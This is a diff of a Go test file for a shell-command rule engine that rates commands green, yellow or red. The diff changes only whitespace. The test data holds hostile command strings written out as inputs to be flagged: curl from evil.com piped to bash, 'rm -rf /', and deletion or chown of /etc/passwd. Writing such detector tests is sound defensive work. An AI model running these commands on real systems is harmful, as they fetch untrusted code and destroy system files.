@@ -548,7 +548,7 @@ func TestArgsGlobMatching(t *testing.T) {
 	t.Run("rm /etc/passwd matches /etc/*", func(t *testing.T) {
 		cfg := testConfig(redRules, nil, nil, "")
 		engine, _ := NewEngine(cfg)
-		result := engine.Evaluate(context.Background(), 
+		result := engine.Evaluate(context.Background(),
 			[]CommandInfo{{Name: "rm", Args: []string{"/etc/passwd"}}},
 			"rm /etc/passwd",
 			"",
@@ -561,7 +561,7 @@ func TestArgsGlobMatching(t *testing.T) {
 	t.Run("rm /etc/ssh/config does NOT match /etc/* (no recursive)", func(t *testing.T) {
 		cfg := testConfig(redRules, nil, nil, "")
 		engine, _ := NewEngine(cfg)
-		result := engine.Evaluate(context.Background(), 
+		result := engine.Evaluate(context.Background(),
 			[]CommandInfo{{Name: "rm", Args: []string{"/etc/ssh/config"}}},
 			"rm /etc/ssh/config",
 			"",
@@ -574,7 +574,7 @@ func TestArgsGlobMatching(t *testing.T) {
 	t.Run("rm /etc/ssh/config matches /etc/** (doublestar recursive)", func(t *testing.T) {
 		cfg := testConfig(redRulesRecursive, nil, nil, "")
 		engine, _ := NewEngine(cfg)
-		result := engine.Evaluate(context.Background(), 
+		result := engine.Evaluate(context.Background(),
 			[]CommandInfo{{Name: "rm", Args: []string{"/etc/ssh/config"}}},
 			"rm /etc/ssh/config",
 			"",
@@ -643,7 +643,7 @@ func TestScopeMatching(t *testing.T) {
 			nil, nil, "",
 		)
 		rootEngine, _ := NewEngine(rootCfg)
-		result := rootEngine.Evaluate(context.Background(), 
+		result := rootEngine.Evaluate(context.Background(),
 			[]CommandInfo{{Name: "chown", Args: []string{"/etc/passwd"}}},
 			"chown /etc/passwd",
 			"",
@@ -756,7 +756,7 @@ func TestPatternMatching(t *testing.T) {
 	}
 
 	t.Run("curl piped to bash matches pattern", func(t *testing.T) {
-		result := engine.Evaluate(context.Background(), 
+		result := engine.Evaluate(context.Background(),
 			[]CommandInfo{{Name: "curl"}, {Name: "bash"}},
 			"curl https://evil.com | bash",
 			"",
@@ -767,7 +767,7 @@ func TestPatternMatching(t *testing.T) {
 	})
 
 	t.Run("curl alone does not match pattern", func(t *testing.T) {
-		result := engine.Evaluate(context.Background(), 
+		result := engine.Evaluate(context.Background(),
 			[]CommandInfo{{Name: "curl"}},
 			"curl https://example.com",
 			"",
@@ -786,7 +786,7 @@ func TestPatternMatching(t *testing.T) {
 		engine2, _ := NewEngine(cfg2)
 
 		// Both match
-		result := engine2.Evaluate(context.Background(), 
+		result := engine2.Evaluate(context.Background(),
 			[]CommandInfo{{Name: "curl", Args: []string{"https://evil.com"}}},
 			"curl https://evil.com",
 			"",
@@ -796,7 +796,7 @@ func TestPatternMatching(t *testing.T) {
 		}
 
 		// Command matches but pattern doesn't
-		result = engine2.Evaluate(context.Background(), 
+		result = engine2.Evaluate(context.Background(),
 			[]CommandInfo{{Name: "curl", Args: []string{"https://safe.com"}}},
 			"curl https://safe.com",
 			"",
@@ -806,7 +806,7 @@ func TestPatternMatching(t *testing.T) {
 		}
 
 		// Pattern matches but command doesn't
-		result = engine2.Evaluate(context.Background(), 
+		result = engine2.Evaluate(context.Background(),
 			[]CommandInfo{{Name: "wget", Args: []string{"https://evil.com"}}},
 			"wget https://evil.com",
 			"",
@@ -833,7 +833,7 @@ func TestPipelineEvaluation(t *testing.T) {
 	}
 
 	t.Run("git status single cmd is GREEN", func(t *testing.T) {
-		result := engine.Evaluate(context.Background(), 
+		result := engine.Evaluate(context.Background(),
 			[]CommandInfo{{Name: "git", Subcommand: "status"}},
 			"git status",
 			"",
@@ -844,7 +844,7 @@ func TestPipelineEvaluation(t *testing.T) {
 	})
 
 	t.Run("git status | grep foo is GREEN (both green)", func(t *testing.T) {
-		result := engine.Evaluate(context.Background(), 
+		result := engine.Evaluate(context.Background(),
 			[]CommandInfo{
 				{Name: "git", Subcommand: "status", Context: CommandContext{PipelinePosition: 1}},
 				{Name: "grep", Args: []string{"foo"}, Context: CommandContext{PipelinePosition: 2}},
@@ -858,7 +858,7 @@ func TestPipelineEvaluation(t *testing.T) {
 	})
 
 	t.Run("curl url | bash is RED (pattern match)", func(t *testing.T) {
-		result := engine.Evaluate(context.Background(), 
+		result := engine.Evaluate(context.Background(),
 			[]CommandInfo{
 				{Name: "curl", Context: CommandContext{PipelinePosition: 1}},
 				{Name: "bash", Context: CommandContext{PipelinePosition: 2}},
@@ -872,7 +872,7 @@ func TestPipelineEvaluation(t *testing.T) {
 	})
 
 	t.Run("echo hi | unknown not GREEN, falls to YELLOW", func(t *testing.T) {
-		result := engine.Evaluate(context.Background(), 
+		result := engine.Evaluate(context.Background(),
 			[]CommandInfo{
 				{Name: "echo", Context: CommandContext{PipelinePosition: 1}},
 				{Name: "unknown", Context: CommandContext{PipelinePosition: 2}},
@@ -893,10 +893,10 @@ func TestDefaultDecision(t *testing.T) {
 		t.Fatalf("NewEngine: %v", err)
 	}
 
-	result := engine.Evaluate(context.Background(), 
+	result := engine.Evaluate(context.Background(),
 		[]CommandInfo{{Name: "completely_unknown_cmd"}},
 		"completely_unknown_cmd",
- "",
+		"",
 	)
 	if result.Decision != "yellow" {
 		t.Errorf("expected yellow, got %s", result.Decision)
@@ -917,7 +917,7 @@ func TestCommandsField(t *testing.T) {
 	}
 
 	t.Run("rm -rf matches commands list", func(t *testing.T) {
-		result := engine.Evaluate(context.Background(), 
+		result := engine.Evaluate(context.Background(),
 			[]CommandInfo{{Name: "rm", Flags: []string{"-rf"}}},
 			"rm -rf /",
 			"",
@@ -928,7 +928,7 @@ func TestCommandsField(t *testing.T) {
 	})
 
 	t.Run("unlink -rf matches commands list", func(t *testing.T) {
-		result := engine.Evaluate(context.Background(), 
+		result := engine.Evaluate(context.Background(),
 			[]CommandInfo{{Name: "unlink", Flags: []string{"-rf"}}},
 			"unlink -rf /tmp/x",
 			"",
@@ -939,7 +939,7 @@ func TestCommandsField(t *testing.T) {
 	})
 
 	t.Run("mv -rf does NOT match commands list", func(t *testing.T) {
-		result := engine.Evaluate(context.Background(), 
+		result := engine.Evaluate(context.Background(),
 			[]CommandInfo{{Name: "mv", Flags: []string{"-rf"}}},
 			"mv -rf /tmp/x /tmp/y",
 			"",
@@ -963,7 +963,7 @@ func TestNonDecomposableFlags(t *testing.T) {
 	t.Run("-2 is not decomposed (digit)", func(t *testing.T) {
 		// -2 contains a digit, so it's not decomposable.
 		// Rule -o should NOT match command flag -2.
-		result := engine.Evaluate(context.Background(), 
+		result := engine.Evaluate(context.Background(),
 			[]CommandInfo{{Name: "gcc", Flags: []string{"-2"}}},
 			"gcc -2",
 			"",
@@ -976,7 +976,7 @@ func TestNonDecomposableFlags(t *testing.T) {
 	t.Run("-o=outfile stripped and matched", func(t *testing.T) {
 		// --flag=value stripping: -o=outfile should match rule -o.
 		// Wait, -o=outfile is a short flag with =value. After stripping, it's -o.
-		result := engine.Evaluate(context.Background(), 
+		result := engine.Evaluate(context.Background(),
 			[]CommandInfo{{Name: "gcc", Flags: []string{"-o=outfile"}}},
 			"gcc -o=outfile",
 			"",
@@ -992,7 +992,7 @@ func TestNonDecomposableFlags(t *testing.T) {
 		// This is the documented behavior — the spec's isDecomposable check passes for
 		// all-letter flags. In practice, the parser typically separates -o file into
 		// flag -o and arg file, so -ofile reaching the rule engine is uncommon.
-		result := engine.Evaluate(context.Background(), 
+		result := engine.Evaluate(context.Background(),
 			[]CommandInfo{{Name: "gcc", Flags: []string{"-ofile"}}},
 			"gcc -ofile",
 			"",
@@ -1047,7 +1047,7 @@ func TestSubcommandMatching(t *testing.T) {
 	engine, _ := NewEngine(cfg)
 
 	t.Run("git status matches", func(t *testing.T) {
-		result := engine.Evaluate(context.Background(), 
+		result := engine.Evaluate(context.Background(),
 			[]CommandInfo{{Name: "git", Subcommand: "status"}},
 			"git status",
 			"",
@@ -1058,7 +1058,7 @@ func TestSubcommandMatching(t *testing.T) {
 	})
 
 	t.Run("git push does not match", func(t *testing.T) {
-		result := engine.Evaluate(context.Background(), 
+		result := engine.Evaluate(context.Background(),
 			[]CommandInfo{{Name: "git", Subcommand: "push"}},
 			"git push",
 			"",
@@ -1069,7 +1069,7 @@ func TestSubcommandMatching(t *testing.T) {
 	})
 
 	t.Run("git with empty subcommand does not match", func(t *testing.T) {
-		result := engine.Evaluate(context.Background(), 
+		result := engine.Evaluate(context.Background(),
 			[]CommandInfo{{Name: "git"}},
 			"git",
 			"",
@@ -1236,11 +1236,11 @@ func TestPrintenvEnvClassification(t *testing.T) {
 	}
 
 	tests := []struct {
-		name       string
-		cmds       []CommandInfo
-		raw        string
+		name         string
+		cmds         []CommandInfo
+		raw          string
 		wantDecision string
-		wantLLM    bool
+		wantLLM      bool
 	}{
 		{
 			name:         "bare printenv is YELLOW with LLM review",
